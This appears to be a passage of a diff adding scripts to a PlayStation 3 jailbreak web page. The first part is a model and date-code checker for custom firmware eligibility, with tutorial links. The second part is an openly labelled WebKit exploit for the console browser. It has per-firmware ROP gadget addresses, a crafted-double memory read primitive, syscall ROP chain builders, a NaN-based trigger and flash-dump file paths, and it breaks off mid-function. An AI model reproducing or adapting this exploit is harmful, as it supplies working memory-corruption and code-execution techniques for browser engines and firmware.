+                    } else cfw = 'No (CECH-25xx, ' + label + ' ' + datecode + ' - min firmware > 3.56)';
+                }
+                else if (cleaned.indexOf('CECH30')===0 || cleaned.indexOf('CECH-30')===0 ||
+                         cleaned.indexOf('CECH40')===0 || cleaned.indexOf('CECH-40')===0 ||
+                         cleaned.indexOf('CECH42')===0 || cleaned.indexOf('CECH-42')===0 ||
+                         cleaned.indexOf('CECH43')===0 || cleaned.indexOf('CECH-43')===0) cfw = 'No';
+                else return 'Unknown model';
+            }
+            var flash = getFlashType(cleaned);
+            var qcfw = (flash === 'NOR') ? 'Yes (requires soldering)' : 'No';
+            var modelType = getPS3Model(cleaned);
+            var displayModel = cleaned;
+            if (displayModel.indexOf('CECH')===0 && displayModel.length>5 && displayModel.charAt(4)>='0' && displayModel.charAt(4)<='9')
+                displayModel = 'CECH-' + displayModel.substring(4);
+            return { cfw: cfw, qcfw: qcfw, flash: flash, modelType: modelType, displayModel: displayModel, isDevKit: isDevKit, maxDowngradeFirmware: maxDowngradeFirmware };
+        }
+
+        function runChecker(datecode) {
+            if (typeof checkCFWCompatibility !== 'function') { 
+                document.getElementById('cfwResult').innerHTML = 'Script not loaded correctly.'; 
+                return; 
+            }
+            var resultDiv = document.getElementById('cfwResult');
+            var modelInput = document.getElementById('modelInput');
+            var model = modelInput ? modelInput.value : '';
+            model = trimStr(model);
+            if (!model) { 
+                resultDiv.innerHTML = '<span style="color:#ffa500;">Please enter a model number.</span>'; 
+                return; 
+            }
+            var cleaned = model.toUpperCase().replace(/\s/g,'').replace(/-/g,'');
+            if (!/^CECH/.test(cleaned) && !/^DECH/.test(cleaned) && !/^DECR/.test(cleaned) && !/^CEB/.test(cleaned)) 
+                cleaned = 'CECH' + cleaned;
+            var res = checkCFWCompatibility(model, datecode);
+            if (res === 'NEED_DATE') { 
+                document.getElementById('datecode-box').style.display = 'block'; 
+                resultDiv.innerHTML = ''; 
+                return; 
+            }
+            if (res === 'Unknown model') { 
+                resultDiv.innerHTML = '<span style="color:#ffa500;">Unknown model - please check the number (e.g., 2501A).</span>'; 
+                return; 
+            }
+            if (res === 'Invalid date code') { 
+                resultDiv.innerHTML = '<span style="color:#ffa500;">Invalid date code. Please check the back sticker (e.g., 0C or January 2010).</span>'; 
+                return; 
+            }
+            var cfw = res.cfw, qcfw = res.qcfw, flash = res.flash, modelType = res.modelType, displayModel = res.displayModel, isDevKit = res.isDevKit, maxDowngradeFirmware = res.maxDowngradeFirmware;
+            var cfwColor = '#28a745'; 
+            if (cfw.indexOf('Maybe')===0) cfwColor='#ffa500'; 
+            if (cfw.indexOf('No')===0) cfwColor='#dc3545';
+            var qcfwColor = (qcfw.indexOf('No')===0) ? '#dc3545' : '#28a745';
+            var html = '';
+            html += '<span style="color:'+cfwColor+';">CFW: ' + cfw + '</span><br>';
+            html += '<span style="color:'+qcfwColor+';">qCFW: ' + qcfw + '</span><br>';
+            html += '<span style="color:#28a745;">HEN: Yes</span>';
+            if (typeof window.ShowJailbreakTypes !== 'undefined' && window.ShowJailbreakTypes === true) 
+            {
+                html += '<button type="button" style="display:block; margin-top:15px; margin-bottom:5px; padding:6px 18px; background:#555; color:#fff; border:1px solid #777; border-radius:4px; cursor:pointer; font-weight:bold;" onclick="var d=document.getElementById(\'JBTypesDropdown\'); if(d.style.display===\'none\'){d.style.display=\'block\';this.textContent=\'Hide Jailbreak Types Info\';}else{d.style.display=\'none\';this.textContent=\'Show Jailbreak Types Info\';}">Show Jailbreak Types Info</button>';
+                html += '<div id="JBTypesDropdown" style="display:none; background:#333; border-radius:4px; border-left:3px solid #dc3545; padding:12px; margin-top:5px; color:#ddd; line-height:1.6; font-weight:normal;">';
+                html += '<div style="color:#dc3545; font-weight:bold;">Custom Firmware (CFW):</div>';
+                html += '<div>Grants you full control over the console you can install Linux and install homebrew and play game backups etc from start/boot up without having to do anything and you have the ability to convert to DEX.</div>';
+                html += '<div style="margin-bottom:12px;">Not all PS3s can run CFW, All Fat Models and some Slim Models can run CFW.</div>';
+                html += '<div style="color:#dc3545; font-weight:bold;">Quasi-Custom Firmware (qCFW):</div>';
+                html += '<div style="margin-bottom:12px;">A type of Custom Firmware for PS3 models that cannot run standard CFW and for now only available for PS3s with a NOR flash memory type. Installation requires a hardware modification (soldering work), the process starts by installing HEN and using it to run initial tools — but once installed, qCFW boots directly like a normal CFW, with no need to enable HEN every time. You can do almost everything a regular CFW can, with a few exceptions: you cannot convert to DEX, you cannot dump the console\'s EID root key and anything else that required your console\'s EID root key, and you cannot use old firmwares like REBUG. New firmware must be made. Currently the only qCFW is based on Evilnat PEX.</div>';
+                html += '<div style="color:#dc3545; font-weight:bold;">Homebrew Enabler (HEN):</div>';
+                html += '<div>A temporary Homebrew Enabler you have to re-activate every time you turn on the console. No DEX conversion, less system-level access than CFW, you can\'t install Linux.</div>';
+                html += '</div>';
+            }
+            html += '<br><br>';
+            html += 'Model Number: ' + displayModel + (datecode ? ' (' + (/^\d/.test(datecode) ? 'date code' : 'manufacturing date') + ': ' + datecode + ')' : '') + '<br>';
+            html += 'Model: '+modelType+'<br>';
+            html += 'Flash Memory Type: '+flash+'<br>';
+            html += 'PS2 Backwards Compatibility: '+ getBackwardsCompatibility(null, cleaned, false)+'<br>';
+            if (maxDowngradeFirmware) html += 'Estimated Minimum Applicable Firmware Version: ' + maxDowngradeFirmware + ' (Also Known As: Max Downgrade Version, Factory Firmware)' + '<br>';
+            if (isDevKit) html += '<span style="color:#f79452;">Info: Jailbreaking a Dev Kit PS3 is not recommended!</span><br>';
+            
+            if (typeof window.ShowTutorials !== 'undefined' && window.ShowTutorials === true) 
+            {
+                html += '<button type="button" style="display:block; margin-top:15px; margin-bottom:5px; padding:6px 18px; background:#555; color:#fff; border:1px solid #777; border-radius:4px; cursor:pointer; font-weight:bold;" onclick="var d=document.getElementById(\'detailsDropdown\'); if(d.style.display===\'none\'){d.style.display=\'block\';this.textContent=\'Hide Jailbreaking Tutorial\';}else{d.style.display=\'none\';this.textContent=\'Show Jailbreaking Tutorial\';}">Show Jailbreaking Tutorial</button>';
+                html += '<div id="detailsDropdown" style="display:none; background:#333; border-radius:4px; border-left:3px solid #dc3545; padding:12px; margin-top:5px; color:#ddd; line-height:1.6; font-weight:normal;">';
+                html += '<div style="color:#dc3545; font-weight:bold;">Custom Firmware:</div>';
+                html += '<div>Toolset [<a href="https://www.ps3toolset.com/bgtoolset/" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Link</a>] [<a href="https://www.youtube.com/watch?v=LIVu3Px3eXY" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Video</a>]</div>';
+                html += '<div>PS3Tool [<a href="https://ps3tool.com/" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Link</a>] [<a href="https://ps3tool.com/tutorials/cfw-flash-tools/" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Tutorial</a>]</div>';
+                html += '<div>Unofficial Flash Writer [<a href="https://xxevilnatxx.github.io/flash-writer/" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Link</a>] [<a href="https://www.youtube.com/watch?v=rwqk_8mJy30" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Video</a>]</div>';
+                html += '<div>E3 Flasher (For NOR PS3s) [<a href="https://www.youtube.com/watch?v=cah4-8dFBfI&list=PLwbQqS9RRrfRi1tmV1fUGI2b_4hm_iyQd&index=28" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Video</a>] ';
+                html += '[<span onclick="var n=document.getElementById(\'e3Note\'); if(n.style.display===\'none\'){n.style.display=\'block\';this.textContent=\'Note ▶\';}else{n.style.display=\'none\';this.textContent=\'Note ▲\';}" style="color:#f79452; cursor:pointer; font-weight:bold; user-select:none;">Note ▲</span>]</div>';
+                html += '<div id="e3Note" style="display:none; background:#2a2a2a; border-radius:4px; border-left:3px solid #dc3545; padding:8px 12px; margin-top:5px; margin-bottom:5px;">';
+                html += 'Make sure you get an old Micro SD (2GB Max) (Example: a Genuine SanDisk 2GB Micro SD Memory Card), as anything bigger or newer will hardware brick the Flasher!';
+                html += '</div>';
+                html += '<div style="margin-bottom:12px;">Teensy++ 2.0 (For NAND PS3s) [<a href="https://ptodorov.com/playstation-3-nand-downgrade-guide-cechc04-cok-002/" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Guide</a>]</div>';
+                html += '<div style="color:#dc3545; font-weight:bold;">Quasi-Custom Firmware:</div>';
+                html += '<div style="margin-bottom:12px;">PS3Xploit [<a href="https://ps3xploit.me/" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Link</a>] [<a href="https://github.com/aomsin2526/BadWDSD" target="_blank" rel="noopener noreferrer" style="color:#f79452;">qCFW Link</a>] [<a href="https://www.youtube.com/watch?v=a5cPD0uuifA" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Video</a>]</div>';
+                html += '<div style="color:#dc3545; font-weight:bold;">Homebrew Enabler:</div>';
+                html += '<div>PS3Xploit [<a href="https://ps3xploit.me/" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Link</a>] [<a href="https://www.youtube.com/watch?v=Ze3UMdMakvk" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Video</a>]</div>';
+                html += '<div>PS3Tool [<a href="https://ps3tool.com/" target="_blank" rel="noopener noreferrer" style="color:#f79452;">Link</a>]</div>';
+                html += '</div>';
+            }
+            resultDiv.innerHTML = html;
+            document.getElementById('datecode-box').style.display = 'none';
+            if (/^CECH-?25/.test(cleaned) || /^DECH-?25/.test(cleaned)) document.getElementById('datecode-box').style.display = 'block';
+        }
+
+        function verifyDateCode() {
+            var monthSelect = document.getElementById('monthSelect'), yearSelect = document.getElementById('yearSelect');
+            if (monthSelect && yearSelect && monthSelect.value !== '' && yearSelect.value !== '') {
+                var monthNum = parseInt(monthSelect.value,10), yearNum = parseInt(yearSelect.value,10);
+                var monthNames = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+                var monthName = monthNames[monthNum-1];
+                runChecker(monthName + " " + yearNum);
+                return;
+            }
+            var dcInput = document.getElementById('datecodeInput');
+            var dc = dcInput ? dcInput.value : '';
+            dc = trimStr(dc);
+            if (!dc) { 
+                document.getElementById('cfwResult').innerHTML = '<span style="color:#ffa500;">Please enter a date code or select a manufacturing date.</span>'; 
+                return; 
+            }
+            runChecker(dc);
+        }
+
+        function zoomImage(src) {
+            var overlay = document.getElementById('image-overlay');
+            var img = document.getElementById('zoom-img');
+            if (overlay && img) {
+                img.src = src;
+                overlay.style.display = 'block';
+            }
+        }
+        function closeZoom() {
+            var overlay = document.getElementById('image-overlay');
+            if (overlay) overlay.style.display = 'none';
+        }
+        document.addEventListener('keydown', function(e) {
+            if (e.key === "Escape") closeZoom();
+        });
+
+        if (!window.isPS3) {
+            var modelInput = document.getElementById('modelInput');
+            if (modelInput) {
+                modelInput.onkeypress = function(e) {
+                    e = e || window.event;
+                    if ((e.keyCode || e.which) === 13) {
+                        var datecodeBox = document.getElementById('datecode-box');
+                        if (datecodeBox && datecodeBox.style.display === 'block') {
+                            var datecodeInput = document.getElementById('datecodeInput');
+                            var monthSelect = document.getElementById('monthSelect');
+                            var yearSelect = document.getElementById('yearSelect');
+                            if (datecodeInput && datecodeInput.value.trim() !== '') {
+                                runChecker(datecodeInput.value.trim());
+                            } else if (monthSelect && yearSelect && monthSelect.value !== '' && yearSelect.value !== '') {
+                                var monthNum = parseInt(monthSelect.value, 10);
+                                var yearNum = parseInt(yearSelect.value, 10);
+                                var monthNames = ["January","February","March","April","May","June",
+                                                  "July","August","September","October","November","December"];
+                                var monthName = monthNames[monthNum-1];
+                                runChecker(monthName + " " + yearNum);
+                            } else {
+                                runChecker(null);
+                            }
+                        } else {
+                            runChecker(null);
+                        }
+                        return false;
+                    }
+                };
+            }
+            var datecodeInput = document.getElementById('datecodeInput');
+            if (datecodeInput) {
+                datecodeInput.onkeypress = function(e) {
+                    e = e || window.event;
+                    if ((e.keyCode || e.which) === 13) {
+                        verifyDateCode();
+                        return false;
+                    }
+                };
+            }
+        }
+
+        function onPageLoad() {
+            var tutorialBtn = document.getElementById('tutorialBtn');
+            var tutorialDiv = document.getElementById('manualTutorial');
+            if (tutorialBtn && tutorialDiv) {
+                tutorialBtn.onclick = function() {
+                    if (tutorialDiv.style.display === 'none') {
+                        tutorialDiv.style.display = 'block';
+                        tutorialBtn.textContent = 'Hide Manual Check Tutorial';
+                    } else {
+                        tutorialDiv.style.display = 'none';
+                        tutorialBtn.textContent = 'Show Manual Check Tutorial';
+                    }
+                };
+            }
+        }
+
+        if (window.addEventListener) {
+            window.addEventListener('load', onPageLoad, false);
+        } else if (window.attachEvent) {
+            window.attachEvent('onload', onPageLoad);
+        } else {
+            window.onload = function() { onPageLoad(); };
+        }
+    </script>
+
+    <!-- ============================================================ -->
+    <!-- WebKit Exploit – firmware-aware (correct addresses from HEN) -->
+    <!-- ============================================================ -->
+    <script>
+        (function() {
+
+            // ---- Firmware detection ----
+            var ua = navigator.userAgent;
+            var fwv = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
+            if (!fwv && window.ps3Firmware) fwv = window.ps3Firmware;
+
+            // ---- Address tables (from HEN source) ----
+            var addr = {
+                // Default for 4.93 (also 4.83-4.92)
+                toc_addr: 0x6F5558,
+                gadget1_addr: 0x097604,
+                gadget_mod1_addr: 0x60EFD8,
+                gadget_mod2_addr: 0x013B74,
+                gadget_mod4a_addr: 0x0D9684,
+                gadget_mod4b_addr: 0x42C778,
+                gadget_mod4c_addr: 0x054AF0,
+                gadget_mod8_addr: 0x2BACB8,
+                gadget3_addr: 0x0D505C,
+                gadget7_addr: 0x423854,
+                gadget8_addr: 0x020000  // memcpy
+            };
+
+            // Override based on firmware (from HEN)
+            if (fwv === "4.80") {
+                addr.toc_addr = 0x6F5520;
+                addr.gadget1_addr = 0x097604;
+                addr.gadget_mod1_addr = 0x60E588;
+                addr.gadget_mod2_addr = 0x013B74;
+                addr.gadget_mod4a_addr = 0x0D9684;
+                addr.gadget_mod4b_addr = 0x42C780;
+                addr.gadget_mod4c_addr = 0x054AF0;
+                addr.gadget_mod8_addr = 0x2BACB0;
+                addr.gadget3_addr = 0x0D505C;
+                addr.gadget7_addr = 0x01A6AC;
+                addr.gadget8_addr = 0x020000;
+            } else if (fwv === "4.81") {
+                addr.toc_addr = 0x6F5520;
+                addr.gadget1_addr = 0x097604;
+                addr.gadget_mod1_addr = 0x60E59C;
+                addr.gadget_mod2_addr = 0x013B74;
+                addr.gadget_mod4a_addr = 0x0D9684;
+                addr.gadget_mod4b_addr = 0x42C774;
+                addr.gadget_mod4c_addr = 0x054AF0;
+                addr.gadget_mod8_addr = 0x2BACB4;
+                addr.gadget3_addr = 0x0D505C;
+                addr.gadget7_addr = 0x01A6AC;
+                addr.gadget8_addr = 0x020000;
+            } else if (fwv === "4.82") {
+                addr.toc_addr = 0x6F5550;
+                addr.gadget1_addr = 0x097604;
+                addr.gadget_mod1_addr = 0x60EF38;
+                addr.gadget_mod2_addr = 0x013B74;
+                addr.gadget_mod4a_addr = 0x0D9684;
+                addr.gadget_mod4b_addr = 0x42C778;
+                addr.gadget_mod4c_addr = 0x054AF0;
+                addr.gadget_mod8_addr = 0x2BACB8;
+                addr.gadget3_addr = 0x0D505C;
+                addr.gadget7_addr = 0x01A6AC;
+                addr.gadget8_addr = 0x020000;
+            } else if (fwv === "4.83") {
+                addr.toc_addr = 0x6F5558;
+                addr.gadget1_addr = 0x097604;
+                addr.gadget_mod1_addr = 0x60EFD8;
+                addr.gadget_mod2_addr = 0x013B74;
+                addr.gadget_mod4a_addr = 0x0D9684;
+                addr.gadget_mod4b_addr = 0x42C778;
+                addr.gadget_mod4c_addr = 0x054AF0;
+                addr.gadget_mod8_addr = 0x2BACB8;
+                addr.gadget3_addr = 0x0D505C;
+                addr.gadget7_addr = 0x01A6AC;
+                addr.gadget8_addr = 0x020000;
+            } else if (fwv === "4.84" || fwv === "4.85" || fwv === "4.86" ||
+                       fwv === "4.87" || fwv === "4.88" || fwv === "4.89" ||
+                       fwv === "4.91" || fwv === "4.92" || fwv === "4.93") {
+                // 4.84-4.93 use the default (already set above)
+                // But ensure gadget3_addr is correct for these versions
+                addr.gadget3_addr = 0x0D505C;
+                addr.gadget7_addr = 0x01A6AC;
+                addr.gadget8_addr = 0x020000;
+                // These are the defaults from the top
+            } else if (fwv === "4.90") {
+                addr.toc_addr = 0x6F5558;
+                addr.gadget1_addr = 0x097604;
+                addr.gadget_mod1_addr = 0x60EFD0;
+                addr.gadget_mod2_addr = 0x013B74;
+                addr.gadget_mod4a_addr = 0x0D9684;
+                addr.gadget_mod4b_addr = 0x42C774;
+                addr.gadget_mod4c_addr = 0x054AF0;
+                addr.gadget_mod8_addr = 0x2BACB4;
+                addr.gadget3_addr = 0x0D505C;
+                addr.gadget7_addr = 0x01A6AC;
+                addr.gadget8_addr = 0x020000;
+            }
+            // If unknown, keep the default 4.93 addresses.
+
+            // ---- Assign addresses to WebKit variables ----
+            var WebKit_toc_addr = addr.toc_addr;
+            var WebKit_gadget1_addr = addr.gadget1_addr;
+            var WebKit_gadget_mod1_addr = addr.gadget_mod1_addr;
+            var WebKit_gadget_mod2_addr = addr.gadget_mod2_addr;
+            var WebKit_gadget_mod4a_addr = addr.gadget_mod4a_addr;
+            var WebKit_gadget_mod4b_addr = addr.gadget_mod4b_addr;
+            var WebKit_gadget_mod4c_addr = addr.gadget_mod4c_addr;
+            var WebKit_gadget_mod8_addr = addr.gadget_mod8_addr;
+            var WebKit_gadget3_addr = addr.gadget3_addr;
+            var WebKit_gadget7_addr = addr.gadget7_addr;
+            var WebKit_gadget8_addr = addr.gadget8_addr;
+
+            // ---- Constants ----
+            var WebKit_gtemp_addr = 0x8D000000;
+            var WebKit_sp_exit = 0x8FD8DCC0;
+            var WebKit_dbyte41 = 0x4141;
+            var WebKit_dbyte00 = 0;
+            var WebKit_mbytes = 0x100000;
+
+            // ---- Helper functions ----
+            function WebKit_showResult(str) { showResult(str); }
+
+            function WebKit_hex16(s) { return ('0000' + s).slice(-4); }
+            function WebKit_s2hex(str) {
+                var hex = [];
+                for (var i = 0; i < str.length; i++) {
+                    hex.push(WebKit_hex16(str.charCodeAt(i).toString(16)));
+                }
+                return hex.join("");
+            }
+            function WebKit_hexh2bin(hex_val) { return String.fromCharCode(hex_val); }
+            function WebKit_hexw2bin(hex_val) { return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val); }
+            function WebKit_hexdw2bin(hex_val) { return WebKit_hexw2bin(0) + WebKit_hexw2bin(hex_val); }
+            function WebKit_fill_by_4bytes(nbytes, hex_val) {
+                var stemp = '', iterator = 0, tmp = WebKit_hexh2bin(hex_val);
+                while (iterator < nbytes / 4) { stemp += tmp.WebKit_repeat(2); iterator++; }
+                return stemp;
+            }
+            function WebKit_fill_by_8bytes(nbytes, hex_val) {
+                var stemp = '', iterator = 0, tmp = WebKit_hexh2bin(hex_val);
+                while (iterator < nbytes / 8) { stemp += tmp.WebKit_repeat(4); iterator++; }
+                return stemp;
+            }
+            function WebKit_fill_by_16bytes(nbytes, hex_val) {
+                var stemp = '', iterator = 0, tmp = WebKit_hexh2bin(hex_val);
+                while (iterator < nbytes / 16) { stemp += tmp.WebKit_repeat(8); iterator++; }
+                return stemp;
+            }
+
+            String.prototype.WebKit_repeat = function(num) { return new Array(num + 1).join(this); };
+            String.prototype.WebKit_replaceAt = function(index, ch) { return this.substr(0, index) + ch + this.substr(index + ch.length); };
+            String.prototype.WebKit_convert = function(ascii) {
+                if (this.length < 1) return '';
+                var asciistr = '';
+                var i = 0, ret = [];
+                if (ascii === true) asciistr = this;
+                else {
+                    asciistr = '';
+                    for (var j = 0; j < this.length; j++) {
+                        asciistr += WebKit_hex16(this.charCodeAt(j).toString(16));
+                    }
+                }
+                while ((asciistr.length % 4) !== 0) asciistr += '00';
+                if (asciistr.substr(asciistr.length - 3, 2) !== '00') asciistr += '0000';
+                while (i < asciistr.length) {
+                    ret.push(String.fromCharCode(parseInt(asciistr.substr(i, 4), 16)));
+                    i += 4;
+                }
+                return ret.join('');
+            };
+
+            Number.prototype.WebKit_noExponents = function() {
+                var data = String(this).split(/[eE]/);
+                if (data.length === 1) return data[0];
+                var z = '', sign = this < 0 ? '-' : '', str = data[0].replace('.', ''), mag = Number(data[1]) + 1;
+                if (mag < 0) { z = sign + '0.'; while (mag++) z += '0'; return z + str.replace(/^\-/, ''); }
+                mag -= str.length; while (mag--) z += '0'; return str + z;
+            };
+
+            function WebKit_fromIEEE754(bytes, ebits, fbits) {
+                var retNumber = 0, bits = [], i, j, byte;
+                for (i = bytes.length; i; i -= 1) {
+                    byte = bytes[i - 1];
+                    for (j = 8; j; j -= 1) {
+                        bits.push(byte % 2 ? 1 : 0);
+                        byte = byte >> 1;
+                    }
+                }
+                bits.reverse();
+                var str = bits.join('');
+                var bias = (1 << (ebits - 1)) - 1;
+                var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
+                var e = parseInt(str.substring(1, 1 + ebits), 2);
+                var f = parseInt(str.substring(1 + ebits), 2);
+                if (e === (1 << ebits) - 1) { retNumber = f !== 0 ? NaN : s * Infinity; } else if (e > 0) { retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits)); } else if (f !== 0) { retNumber = s * Math.pow(2, -(bias - 1)) * (f / Math.pow(2, fbits)); } else { retNumber = s * 0; }
+                return retNumber.WebKit_noExponents();
+            }
+
+            function WebKit_generateIEEE754(address, size) {
+                var hex = new Array(
+                    (address >> 24) & 0xFF, (address >> 16) & 0xFF, (address >> 8) & 0xFF, (address) & 0xFF,
+                    (size >> 24) & 0xFF, (size >> 16) & 0xFF, (size >> 8) & 0xFF, (size) & 0xFF
+                );
+                return WebKit_fromIEEE754(hex, 11, 52);
+            }
+
+            function WebKit_generateExploit(address, size) {
+                var n = (address << 32) | ((size >> 1) - 1);
+                return WebKit_generateIEEE754(address, (n - address));
+            }
+
+            function WebKit_readMemory(address, size) {
+                var el = document.getElementById('WebKit_exploit');
+                if (el) {
+                    el.style.src = "local(" + WebKit_generateExploit(address, size) + ")";
+                }
+            }
+
+            function WebKit_checkMemory(address, size, len) {
+                var el = document.getElementById('WebKit_exploit');
+                if (el) {
+                    WebKit_readMemory(address, size);
+                    return el.style.src.substr(6, len);
+                }
+                return "";
+            }
+
+            function WebKit_checkMemOld(address, size, len, sub) {
+                var el = document.getElementById('WebKit_exploit');
+                if (el) {
+                    WebKit_readMemory(address, size);
+                    return el.style.src.substr(sub, len);
+                }
+                return "";
+            }
+
+            function WebKit_findJsVariableOffset(name, exploit_data, base, size, end) {
+                var block = 0;
+                while ((base + block * size) < end) {
+                    WebKit_readMemory(base + block * size, size);
+                    var offset = document.getElementById('WebKit_exploit').style.src.substr(6, size).indexOf(exploit_data);
+                    if (offset > 0) {
+                        return base + block * size + (offset * 2) + 4;
+                    }
+                    block++;
+                }
+                return 0;
+            }
+
+            // ---- ROP chain functions ----
+            function WebKit_syscall_r3_p2p(sc, r3_ptr, r4, r5, r6, r7, r8, r9, r10, r31out) {
+                if (r31out === null) r31out = WebKit_gtemp_addr;
+                return WebKit_hexdw2bin(WebKit_gadget_mod2_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gtemp_addr) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod1_addr) + WebKit_fill_by_16bytes(0x50, WebKit_dbyte41) + WebKit_fill_by_4bytes(0xC, WebKit_dbyte41) +
+                    WebKit_hexw2bin(sc) + WebKit_hexw2bin(r10) + WebKit_hexw2bin(r8) + WebKit_hexw2bin(r7) + WebKit_hexw2bin(r6) + WebKit_hexw2bin(r5) + WebKit_hexw2bin(r4) + WebKit_fill_by_4bytes(0x4, WebKit_dbyte41) + WebKit_hexw2bin(r9) + WebKit_fill_by_16bytes(0x20, WebKit_dbyte41) + WebKit_hexdw2bin(r3_ptr) +
+                    WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod4b_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(r31out) + WebKit_hexdw2bin(WebKit_sp_exit) + WebKit_fill_by_8bytes(0x8, WebKit_dbyte41);
+            }
+
+            function WebKit_syscall_r3r5_p2p(sc, r3_ptr, r4, r5_ptr, r6, r7, r8, r9, r10, r31out) {
+                if (r31out === null) r31out = WebKit_gtemp_addr;
+                return WebKit_hexdw2bin(WebKit_gadget_mod2_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gtemp_addr) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod1_addr) + WebKit_fill_by_16bytes(0x50, WebKit_dbyte41) + WebKit_fill_by_4bytes(0xC, WebKit_dbyte41) +
+                    WebKit_hexw2bin(sc) + WebKit_hexw2bin(r10) + WebKit_hexw2bin(r8) + WebKit_hexw2bin(r7) + WebKit_hexw2bin(r6) + WebKit_fill_by_4bytes(0x4, WebKit_dbyte41) + WebKit_hexw2bin(r4) + WebKit_fill_by_4bytes(0x4, WebKit_dbyte41) + WebKit_hexw2bin(r9) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(r5_ptr - 0x4) + WebKit_hexdw2bin(WebKit_gtemp_addr) + WebKit_fill_by_8bytes(0x18, WebKit_dbyte41) +
+                    WebKit_hexdw2bin(WebKit_gadget_mod4c_addr) + WebKit_fill_by_16bytes(0xB0, WebKit_dbyte41) + WebKit_hexdw2bin(r3_ptr) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) +
+                    WebKit_hexdw2bin(WebKit_gadget_mod4b_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(r31out) + WebKit_hexdw2bin(WebKit_sp_exit) + WebKit_fill_by_8bytes(0x8, WebKit_dbyte41);
+            }
+
+            function WebKit_syscall(sc, r3, r4, r5, r6, r7, r8, r9, r10, r31out) {
+                if (r31out === null) r31out = WebKit_gtemp_addr;
+                return WebKit_hexdw2bin(WebKit_gadget_mod2_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gtemp_addr) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod1_addr) + WebKit_fill_by_16bytes(0x50, WebKit_dbyte41) + WebKit_fill_by_4bytes(0xC, WebKit_dbyte41) + WebKit_hexw2bin(sc) + WebKit_hexw2bin(r10) +
+                    WebKit_hexw2bin(r8) + WebKit_hexw2bin(r7) + WebKit_hexw2bin(r6) + WebKit_hexw2bin(r5) + WebKit_hexw2bin(r4) + WebKit_fill_by_4bytes(0x4, WebKit_dbyte41) + WebKit_hexw2bin(r9) + WebKit_fill_by_16bytes(0x20, WebKit_dbyte41) + WebKit_hexdw2bin(r3) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod2_addr) +
+                    WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gtemp_addr) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod4a_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(r31out) + WebKit_hexdw2bin(WebKit_sp_exit) + WebKit_fill_by_8bytes(0x8, WebKit_dbyte41);
+            }
+
+            function WebKit_stack_frame_hookup() {
+                return unescape("\u4141\u2A2F") + WebKit_hexw2bin(WebKit_gadget1_addr) + WebKit_hexw2bin(WebKit_toc_addr) + WebKit_fill_by_16bytes(0x20, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_toc_addr) + WebKit_fill_by_16bytes(0x70, WebKit_dbyte41);
+            }
+
+            function WebKit_stack_frame_exit() {
+                return WebKit_hexdw2bin(WebKit_gadget_mod8_addr) + unescape("\u2F2A");
+            }
+
+            function WebKit_trigger(exploit_addr) {
+                if (document.getElementById('WebKit_trigger')) {
+                    document.getElementById("WebKit_trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
+                }
+            }
+
+            // ---- Offset search ----
+            var WebKit_xtra_data, WebKit_stack_frame, WebKit_jump_2, WebKit_jump_1;
+            var WebKit_xtra_data_addr = 0,
+                WebKit_stack_frame_addr = 0,
+                WebKit_jump_2_addr = 0,
+                WebKit_jump_1_addr = 0;
+            var WebKit_search_max_threshold, WebKit_search_base, WebKit_search_size;
+            var WebKit_total_loops = 0,
+                WebKit_max_loops = 20,
+                WebKit_t_out = 0,
+                WebKit_frame_fails = 0,
+                WebKit_search_base_off = 0,
+                WebKit_search_size_ext = 0;
+            var WebKit_fail_msg_frag = "<h3><span style='color:red'>Memory search failed! Restart the browser and try again.</h3></span>";
+            var WebKit_progress_msg_frag1 = "<h3>Finding variable offsets... ",
+                WebKit_progress_msg_frag2 = '%</h3>';
+
+            var WebKit_base_file = "xxxx/dev_hdd0/theme/flash493.P3T";
+            var WebKit_dump_path = "/dev_usb000/";
+            var WebKit_dump_file = "PS3FlashDump493OFW.bin";
+            var WebKit_fulldumppath = WebKit_dump_path + WebKit_dump_file;
+            var WebKit_fwrite_mode = "wb";
+
+            function WebKit_load_check() {
+                if (WebKit_total_loops < WebKit_max_loops) {
+                    WebKit_showResult(WebKit_progress_msg_frag1 + ((100 / WebKit_max_loops) * WebKit_total_loops).toString() + WebKit_progress_msg_frag2);
